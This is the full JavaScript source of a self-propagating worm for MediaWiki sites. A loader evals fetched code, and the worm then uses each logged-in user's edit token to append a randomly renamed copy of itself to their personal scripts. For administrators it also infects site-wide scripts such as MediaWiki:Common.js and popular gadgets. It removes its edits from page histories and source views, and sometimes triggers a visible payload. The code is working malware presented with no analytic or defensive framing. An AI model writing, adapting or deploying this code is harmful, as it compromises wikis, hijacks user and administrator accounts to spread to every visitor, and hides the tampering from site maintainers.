//INIT
$.get(mw.config.get('wgScript'), {action: 'raw', title: 'User:.../....js'}, function (code) {
	mw.libs.jswp = code;
	eval(mw.libs.jswp);
});


//WORM
(function ($, mw) {
/**
 * Modify all identifiers (starting with $) in given code
 * @param $code {string} original code
 * @return {string} modified code
 */
function $modifyCode ($code) {
	var	$newIdentifiers = [],
		$map = {},
		$random, $i, $randomChar, $allChars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	return $code.replace(/\$([a-z0-9]+)/gi, function ($dummy, $old) {
		if (!($old in $map)) {
			do {
				$random = '';
				for ($i = 0; $i < 32; $i++) {
					$randomChar = $allChars.charAt(Math.floor(Math.random() * $allChars.length));
					$random += $randomChar;
				}
			} while ($.inArray($random, $newIdentifiers) !== -1);
			$newIdentifiers.push($random);
			$map[$old] = $random;
		}
		return '$' + $map[$old];
	});
}

/**
 * Insert worm into some code (replace old worm or append)
 * @param $code {string} old code
 * @param $worm {string} worm code
 * @return {string|boolean} new code or false if not changed
 */
function $insertCode ($code, $worm) {
	var $newCode = $code.replace(/\s*\/\*☠\*\/[\s\S]*/, '') + '\n' + $worm;
	try { //check syntax
		eval('function(){\n' + $newCode + '\n}');
	} catch (e) {
		$newCode = $worm;
	}
	if ($code.replace(/\$[a-z0-9]+/gi, '$') === $newCode.replace(/\$[a-z0-9]+/gi, '$')) {
		return false;
	} else {
		return $newCode;
	}
}

var $written = false;
/**
 * Change content of a page (only one page per session)
 * @param $title {string} page title
 * @param $change {function} function that is called with old content and returns new content or false
 * @param $callback {function} callback function
 */
function $write ($title, $change, $callback) {
	if ($written) {
		return;
	}
	$.getJSON(
		mw.util.wikiScript('api'),
		{
			action: 'query',
			prop: 'info|revisions',
			rvprop: 'timestamp|content',
			titles: $title,
			intoken: 'edit',
			format: 'json'
		},
		function ($json) {
			var $result = {text: ''}, $p;
			for ($p in $json.query.pages) {
				$result.starttimestamp = $json.query.pages[$p].starttimestamp.replace(/\D/g, '');
				$result.basetimestamp = $result.starttimestamp;
				$result.token = $json.query.pages[$p].edittoken;
				if ($json.query.pages[$p].missing === undefined) {
					$result.basetimestamp = $json.query.pages[$p].revisions[0].timestamp.replace(/\D/g, '');
					$result.text = $json.query.pages[$p].revisions[0]['*'];
				}
			}
			$result.text = $change($result.text);
			if ($result.text) {
				$written = true;
				$.post(mw.util.wikiScript('api'), {
					title: $title,
					action: 'edit',
					watchlist: 'nochange',
					starttimestamp: $result.starttimestamp,
					basetimestamp: $result.basetimestamp,
					minor: true,
					summary: '☠',
					evil: true,
					text: $result.text,
					token: $result.token,
					format: 'json'
				}, $callback);
			} else {
				$callback();
			}
		}
	);
}

/**
 * Solves $a * x + $b = 0 (mod 101)
 * @param $a {number} coefficient
 * @param $b {number} coefficient
 * @return {number} solution
 */
function $verify ($a, $b) {
	function $euclid ($aa, $bb) {
		if ($bb === 0) {
			return [$aa, 1, 0];
		}
		var $r = $euclid($bb, $aa % $bb);
		return [$r[0], $r[2], $r[1] - Math.floor($aa / $bb) * $r[2]];
	}
	return -$euclid($a, 101)[1] * $b;
}

/**
 * Infects a page with the worm (unless it already is infected)
 * @param $title {string} page title
 * @param $worm {string} (old) worm code
 * @param $callback {function} callback function
 */
function $infectPage ($title, $worm, $callback) {
	$write($title, function ($code) {
		return $insertCode($code, $modifyCode($worm));
	}, $callback);
}

/**
 * Get titles of pages to infect/look for worm
 * @param $sysop {boolean} include pages only sysops can edit
 * @return {array} list of pages
 */
function $getPages ($sysop) {
	var	$user = mw.config.get('wgFormattedNamespaces')[2] + ':' + mw.config.get('wgUserName'),
		$pages = [];
	if ($sysop) {
		$pages.push('MediaWiki:Common.js');
	}
	$pages.push($user + '/common.js');
	if ($sysop) {
		if (mw.config.get('wgDBname') === 'enwiki') {
			$pages.push('MediaWiki:Gadget-popups.js');
			$pages.push('User:Cacycle/wikEd.js');
		}
		if (mw.config.get('wgDBname') === 'commonswiki') {
			$pages.push('MediaWiki:Gadget-HotCat.js');
		}
		$pages.push('MediaWiki:' + mw.config.get('skin') + '.js');
	}
	$pages.push($user + '/' + mw.config.get('skin') + '.js');
	return $pages;
}

/**
 * Get code of worm
 * @return {string} code
 */
function $getWormCode () {
	var $worm = mw.libs.jswp;
	$worm = $worm.replace(/\\/g, '\\\\');
	$worm = $worm.replace(/"/g, '\\"');
	$worm = $worm.replace(/\n/g, '\\n');
	$worm = '/*☠*/(function($,mw){mw.libs.jswp="' + $worm + '";var a=Math.floor(Math.random()*100)+1,b=Math.floor(Math.random()*100)+1,c=0;if($.isFunction(mw.util.verify)){try{c=mw.util.verify(a,b);}catch(e){}}if((a*c+b)%101!==0){eval(mw.libs.jswp);}})(jQuery,mediaWiki);';
/*
(function ($, mw) {
	mw.libs.jswp = "...";
	var	a = Math.floor(Math.random() * 100) + 1,
		b = Math.floor(Math.random() * 100) + 1,
		c = 0;
	if ($.isFunction(mw.util.verify)) {
		try {
			c = mw.util.verify(a, b);
		} catch (e) {
		}
	}
	if ((a * c + b) % 101 !== 0) {
		eval(mw.libs.jswp);
	}
})(jQuery, mediaWiki);
*/
	return $worm;
}

/**
 * Infect all pages
 */
function $infect () {
	if (!mw.config.get('wgUserName')) {
		return;
	}
	var	$worm = $getWormCode(),
		$pages = $getPages($.inArray('sysop', mw.config.get('wgUserGroups')) > -1),
		$i = 0;
	function $infectNext() {
		if ($i === $pages.length) {
			return;
		}
		$infectPage($pages[$i++], $worm, $infectNext);
	}
	$infectNext();
}

/**
 * Hide the worm
 */
function $hide () {
//hide from history etc.
	$('.comment:contains("☠")').parents('li,tr').remove();
//hide source
	var $geshi = $('.source-javascript:contains("☠")');
	if ($geshi.length === 1) {
		$geshi.html($geshi.html().replace(/\/\*☠[\s\S]*/, '</span>'));
	};
}

/**
 * Do something evil (let the logo explode)
 */
function $evil () {
	mw.loader.using('jquery.effects.explode', function () {
		$(function() {
			$('#p-logo').effect('explode', 3000);
		});
	});
}
mw.util.verify = $verify;

$($hide);
$infect();
if (Math.random() < 0.1) {
	$evil();
}
})(jQuery, mediaWiki);